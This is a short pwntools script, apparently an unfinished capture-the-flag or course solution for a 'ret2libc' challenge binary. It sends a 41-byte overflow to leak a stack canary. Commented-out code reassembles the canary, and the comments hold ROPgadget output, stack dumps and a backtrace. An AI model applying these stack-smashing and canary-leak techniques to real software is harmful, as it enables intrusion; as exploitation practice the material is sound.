#!/usr/bin/env python3
import pwn
import time

p = pwn.process('./hello')
# p = pwn.remote('140.113.24.241', 30174)

p.recv()
p.send(b'1')

p.recv()
payload = b'A' * 41
p.send(payload)

ret = p.recv()
print(ret)

canary = "00"
check  = "00"
# for i in range(58, 65):
#     canary = canary + str(f'0x{ret[i]:02x}')[-2:]
#     check  = str(f'0x{ret[i]:02x}')[-2:] + check
# canary = "0x" + canary
# check  = "0x" + check
# print("canary ", canary)
# print("check  ", check)

# p.send(b'a' * 40 + canary.encode())

p.interactive() 

# aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

# 0x7f9b40a76000

# -------------------------------------
# clai@73225fe5e1e8:~/source/ret2libc$ ROPgadget --binary ./hello --string "sh"
# clai@73225fe5e1e8:~/source/ret2libc$ ROPgadget --binary ./hello --only "pop|ret"
# Gadgets information
# ============================================================
# 0x0000000000001253 : pop rbp ; ret
# 0x000000000000101a : ret
# 0x0000000000001231 : ret 0x2d

# Unique gadgets found: 3

# -------------------------------------
# input + 40 -> canary

#  RSP    0x7fffffffea80 —▸ 0x7fffffffec48 —▸ 0x7fffffffee63 ◂— 'SHELL=/bin/bash'
# rbp            0x7ffff7fa000a      0x7ffff7fa000a
# rsp            0x7fffffffea80      0x7fffffffea80
# input : 0x7fffffffead0
# canary: 0x7fffffffeaf8

# 0x7fffffffead0: 0x61616161 0x61616161 0x61616161    0x61616161
# 0x7fffffffeae0: 0x61616161 0x61616161 0x61616161    0x61616161
# 0x7fffffffeaf0: 0x0000000a 0x00000000 0x9779da00    0x5d8ae525
# 0x7fffffffeb00: 0xffffeb20 0x00007fff 0x5555549e    0x00005555
# 0x7fffffffeb10: 0x00000000 0x00000000 0xf7ffdad0    0x00000001
# 0x7fffffffeb20: 0x00000001 0x00000000 0xf7e0224a    0x00007fff
# 0x7fffffffeb30: 0xffffec20 0x00007fff 0x55555405    0x00005555
# 0x7fffffffeb40: 0x55554040 0x00000001 0xffffec38    0x00007fff

#  ► 0   0x7ffff7e529bc puts+60
#    1   0x5555555553ee editName+179
#    2   0x55555555549e main+153
#    3   0x7ffff7e0224a __libc_start_call_main+122
#    4   0x7ffff7e02305 __libc_start_main+133
#    5   0x5555555551a5 _start+37

#    0x0000555555555499 <+148>: call   0x55555555533b <editName>
#    0x000055555555549e <+153>: jmp    0x5555555554c6 <main+193>
#    0x00005555555554a0 <+155>: mov    eax,0x0
#    0x00005555555554a5 <+160>: call   0x555555555321 <hello>

#    0x00005555555554c6 <+193>: jmp    0x555555555431 <main+44>